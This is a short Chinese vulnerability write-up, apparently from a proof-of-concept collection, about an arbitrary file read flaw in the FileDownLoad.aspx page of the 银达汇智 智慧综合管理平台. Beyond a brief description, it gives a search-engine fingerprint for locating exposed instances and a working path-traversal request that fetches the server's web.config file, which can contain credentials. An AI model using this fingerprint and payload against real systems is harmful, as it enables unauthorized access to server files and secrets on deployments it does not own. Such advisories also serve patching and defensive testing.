# 银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞

## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

```
银达汇智 智慧综合管理平台
```

## 网络测绘

```
"汇智信息" && title="智慧综合管理平台登入"
```

## 漏洞复现

登陆页面

![image-20220525150952244](images/202205251509315.png)

验证POC

```
/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config
```

![image-20220525151256759](images/202205251512861.png)